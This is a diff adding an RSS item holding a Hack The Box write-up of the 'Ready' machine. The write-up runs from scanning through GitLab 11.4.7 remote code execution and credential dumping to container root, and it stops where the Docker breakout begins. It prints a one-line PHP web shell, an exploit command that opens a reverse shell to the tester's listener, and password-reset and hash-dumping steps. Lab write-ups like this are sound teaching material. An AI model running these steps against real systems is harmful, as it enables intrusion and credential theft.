@@ -8,6 +8,255 @@
     <language>en-us</language>
     <lastBuildDate>Sun, 29 Mar 2020 16:21:41 +0000</lastBuildDate><atom:link href="https://5ysk3y.github.io/htb/guides/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Ready [Medium] - Linux</title>
+      <link>https://5ysk3y.github.io/htb/guides/ready/</link>
+      <pubDate>Tue, 06 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://5ysk3y.github.io/htb/guides/ready/</guid>
+      <description>Overview Ready was a quick an easy box that uses an outdated and vulnerable version of GitLab to allow initial exploitation and shell access to a hosted docker container. From there, root elevation within the container is required so that it&amp;rsquo;s underlying configration can be abused in order to provide root access to the host machine.</description>
+      <content>
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/ready.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Ready was a quick an easy box that uses an outdated and vulnerable version of GitLab to allow initial exploitation and shell access to a hosted docker container. From there, root elevation within the container is required so that it&amp;rsquo;s underlying configration can be abused in order to provide root access to the host machine. Let&amp;rsquo;s see how I did all that!&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
+&lt;p&gt;For reference here&amp;rsquo;s a full (script/version enumeration) outline of the top 1000 ports on the machine:&lt;/p&gt;
+&lt;h5 id=&#34;initial-scan&#34;&gt;Initial Scan:&lt;/h5&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ready.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.10.220&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+Host is up, received conn-refused &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.024s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Scanned at 2021-03-31 16:05:21 BST &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 13s
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
+Reason: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; conn-refused
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
+5080/tcp open  http    syn-ack nginx
+|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; disallowed entries &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; shown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| / /autocomplete/users /search /api /admin /profile
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help
+| /s/ /snippets/new /snippets/*/edit /snippets/*/raw
+| /*/*.git /*/*/fork/new /*/*/repository/archive* /*/*/activity
+| /*/*/new /*/*/edit /*/*/raw /*/*/blame /*/*/commits/*/*
+| /*/*/commit/*.patch /*/*/commit/*.diff /*/*/compare /*/*/branches/new
+| /*/*/tags/new /*/*/network /*/*/graphs /*/*/milestones/new
+| /*/*/milestones/*/edit /*/*/issues/new /*/*/issues/*/edit
+| /*/*/merge_requests/new /*/*/merge_requests/*.patch
+|_/*/*/merge_requests/*.diff /*/*/merge_requests/*/edit
+| http-title: Sign in &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;C2&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;B7 GitLab
+|_Requested resource was http://ready.htb:5080/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap done at Wed Mar 31 16:05:34 2021 -- 1 IP address (1 host up) scanned in 13.73 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As well as a full, but simple, port scan for good measure:&lt;/p&gt;
+&lt;h5 id=&#34;full-scan&#34;&gt;Full Scan:&lt;/h5&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ready.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.10.220&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.022s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65533&lt;/span&gt; closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5080/tcp open  onscreen
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;initial-enumeration&#34;&gt;Initial Enumeration&lt;/h1&gt;
+&lt;p&gt;Following the NMAP scans shown above, we can see that theres 2 ports:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;22/tcp&lt;/strong&gt; (ssh)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;5080/tcp&lt;/strong&gt; (www)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Initially the most interesting port is 5080&amp;ndash; an unusual port to run NGINX on, but it can be looked at none-the-less.&lt;/p&gt;
+&lt;p&gt;Visting the site and we can see that it&amp;rsquo;s actually a Gitlab instance. We can sign up and get access, and establish that there is a repository in existence named &lt;code&gt;ready-channel&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/ready/20210331174542.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Looking at the contents, it looks like its an incredibly(!) old version of the &lt;a href=&#34;https://github.com/drupal/drupal&#34; target=&#34;_blank&#34;&gt;Drupal CMS&lt;/a&gt;
+ - looking at the included CHANGELOG file:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ head CHANGELOG.txt
+
+Drupal 7.56, 2017-06-21
+-----------------------
+- Fixed security issues &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;access bypass&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. See SA-CORE-2017-003.
+
+Drupal 7.55, 2017-06-07
+-----------------------
+- Fixed incompatibility with PHP versions 7.0.19 and 7.1.5 due to duplicate
+  DATE_RFC7231 definition.
+- Made Drupal core pass all automated tests on PHP 7.1.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In total, the repository owner has made a total of 4 commits, most of them excessive in terms of the amount of &amp;ldquo;changes&amp;rdquo; made. This makes it difficult to parse through changes, at a glance, for anything sensitive.&lt;/p&gt;
+&lt;p&gt;Looking around the filesystem, there are some interesting things if you look closely. First, a set of potential MySQL creds:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$databases &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
+  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;database&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;drupal&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;drupaluser&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%%cHzhNC=k9yYN!T&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;port&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;driver&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;prefix&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
+    ),
+  ),
+);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/settings.php&#34;&gt;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/settings.php&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;There also appears to be a shell file, showing as 8 months old, located here:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;( $_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;] ) ) { &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;( $_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 2&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt; ); }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/files/shell.php&#34;&gt;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/files/shell.php&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Some time was spent trying to find a defined &lt;code&gt;base_url&lt;/code&gt; but I wasn&amp;rsquo;t able to find one outside of default definitions. From there, a version number was enumerated via the sites &lt;code&gt;/help&lt;/code&gt; page - this is also available as a link in the top right hand corner of the page:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;GitLab Community Edition 11.4.7&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Looking at exploitDB there is indeed a CVE for this version:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ searchsploit gitlab 11.4.7
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                           |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+GitLab 11.4.7 - RCE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Authenticated&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                                                                  | ruby/webapps/49334.py
+GitLab 11.4.7 - Remote Code Execution &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Authenticated&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                                                | ruby/webapps/49257.py
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Grabbing one of these and running it verbatim gives us a shell as the git user (albeit in a Docker container):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ python3 49334.py -u syskey -p password -g http://ready.htb -l 10.10.14.8 -P &lt;span style=&#34;color:#ae81ff&#34;&gt;9001&lt;/span&gt;                             &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ⨯
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; authenticity_token: VHwOXloRm01plhWdGqA9+DOR2WBpGR+fxfgVtKGvgY6l/GQ+zce4ijRD5ISpJ55L5rE14SQk3WezNZ5jK3hqPg&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Creating project with random name: project266
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Running Exploit
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Exploit completed successfully!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
+&lt;p&gt;Once on the box, a quick poke a round was in order but, honestly, familiarity with Gitlab setups (let alone a docker variant) is limited in my own experience so the easiest thing to start with was an enumeration script like LinPEAS.&lt;/p&gt;
+&lt;p&gt;As it so happens, one of the features for LinPEAS is to enumerate Gitlab files to dump useful information, such as:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&amp;quot;id&amp;quot;=&amp;gt;2,&amp;quot;email&amp;quot;=&amp;gt;&amp;quot;dude@ready.com&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$NOMTXhO31vqykicMa6zj3O.F5PIyI9q/S4c.v22eMSfXNDdtpI2Mm&amp;quot;}
+
+&amp;quot;id&amp;quot;=&amp;gt;3,&amp;quot;email&amp;quot;=&amp;gt;&amp;quot;mitroglou@ready.com&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$4vZAglOnEdNEe1SoNj1IE.RfotOt9gPnOXBEihjd7QBhsUmgmAdLi&amp;quot;}
+
+{&amp;quot;id&amp;quot;=&amp;gt;1,&amp;quot;email&amp;quot;=&amp;gt;&amp;quot;admin@example.com&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$.Kc4bwq3BqLCEzAGJVIJFeK4emNnucvAqk1vCv4Yp45yy2nmrFa.2&amp;quot;}
+
+{&amp;quot;id&amp;quot;=&amp;gt;4, &amp;quot;email&amp;quot;=&amp;gt;&amp;quot;test@test.gr&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$7xK1UPcwvjWIo4ioCz28GeFSt.NR00AHsY2AF.gWzaWwikRVXCTXa&amp;quot;}
+
+gitlab_rails[&#39;smtp_password&#39;] = &amp;quot;wW59U!ZKMbG9+*#h&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As expected, attempting to crack the hashes doesn&amp;rsquo;t yield any results - at least not in a quick amount of time, namely as they&amp;rsquo;re bcrypt hashes. That said, running as the git user has its benefits because passwords can be reset rather easily if needed:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;gitlab&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rails runner &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user = User.find_by(email: &amp;#34;dude@ready.com&amp;#34;); user.password = &amp;#34;ReallySecurePassword123!&amp;#34;; user.password_confirmation = &amp;#34;ReallySecurePassword123!&amp;#34;; user.save!&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After resetting passwords for dude, admin and mitroglou with Gitlab and logging in, there&amp;rsquo;s no additional useful information hidden. A few potential passwords have been garnered though; the SMTP password LinPeas grabbed, above, as well as the MySQL credentials we gathered earlier from poking around GitLab manually.&lt;/p&gt;
+&lt;p&gt;In this case, a quick manual password spray was in order - initially against the &lt;code&gt;dude&lt;/code&gt; user - the win was much better than that though as using &lt;code&gt;su&lt;/code&gt; with the &lt;code&gt;smtp_password&lt;/code&gt; value gets us root on the container:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git@gitlab:~$ su
+Password:
+root@gitlab:/var/opt/gitlab#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we have root, so lets try and breakout this contianer.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
+&lt;p&gt;Once on as the root user, it&amp;rsquo;s generally favorable to run another enumeration scanner, like LinPEAS, to try and aggregate anything you may miss.&lt;/p&gt;
+&lt;p&gt;In this case it highlights an uncommon folder, although this isn&amp;rsquo;t all too difficult to find manually, either.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/opt/backup&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@gitlab:/opt/backup# ls -la
+total 112
+drwxr-xr-x 2 root root  4096 Dec  7 09:25 .
+drwxr-xr-x 1 root root  4096 Dec  1 16:23 ..
+-rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
+-rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
+-rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Inside here there is a &lt;code&gt;docker-compose.yml&lt;/code&gt; file&amp;ndash; presumably the one used to create the container we&amp;rsquo;re in, based on the contents:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2.4&amp;#39;&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;services&lt;/span&gt;:
+  &lt;span style=&#34;color:#f92672&#34;&gt;web&lt;/span&gt;:
+    &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gitlab/gitlab-ce:11.4.7-ce.0&amp;#39;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;restart&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;always&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;hostname&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gitlab.example.com&amp;#39;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;environment&lt;/span&gt;:
+      &lt;span style=&#34;color:#f92672&#34;&gt;GITLAB_OMNIBUS_CONFIG&lt;/span&gt;: |&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        external_url &amp;#39;http://172.19.0.2&amp;#39;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        redis[&amp;#39;bind&amp;#39;]=&amp;#39;127.0.0.1&amp;#39;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        redis[&amp;#39;port&amp;#39;]=6379
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        gitlab_rails[&amp;#39;initial_root_password&amp;#39;]=File.read(&amp;#39;/root_pass&amp;#39;)&lt;/span&gt;        
+    &lt;span style=&#34;color:#f92672&#34;&gt;networks&lt;/span&gt;:
+      &lt;span style=&#34;color:#f92672&#34;&gt;gitlab&lt;/span&gt;:
+        &lt;span style=&#34;color:#f92672&#34;&gt;ipv4_address&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;172.19.0.2&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;ports&lt;/span&gt;:
+      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;5080:80&amp;#39;&lt;/span&gt;
+      &lt;span style=&#34;color:#75715e&#34;&gt;#- &amp;#39;127.0.0.1:5080:80&amp;#39;&lt;/span&gt;
+      &lt;span style=&#34;color:#75715e&#34;&gt;#- &amp;#39;127.0.0.1:50443:443&amp;#39;&lt;/span&gt;
+      &lt;span style=&#34;color:#75715e&#34;&gt;#- &amp;#39;127.0.0.1:5022:22&amp;#39;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:
+      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./srv/gitlab/config:/etc/gitlab&amp;#39;&lt;/span&gt;
+      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./srv/gitlab/logs:/var/log/gitlab&amp;#39;&lt;/span&gt;
+      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./srv/gitlab/data:/var/opt/gitlab&amp;#39;&lt;/span&gt;
+      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./root_pass:/root_pass&amp;#39;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;privileged&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;restart&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;unless-stopped&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;#mem_limit: 1024m&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;networks&lt;/span&gt;:
+  &lt;span style=&#34;color:#f92672&#34;&gt;gitlab&lt;/span&gt;:
+    &lt;span style=&#34;color:#f92672&#34;&gt;driver&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;bridge&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;ipam&lt;/span&gt;:
+      &lt;span style=&#34;color:#f92672&#34;&gt;config&lt;/span&gt;:
+        - &lt;span style=&#34;color:#f92672&#34;&gt;subnet&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;172.19.0.0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;/16&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This also shows one very interesting, and &lt;em&gt;very&lt;/em&gt; vulnerable, thing:&lt;/p&gt;
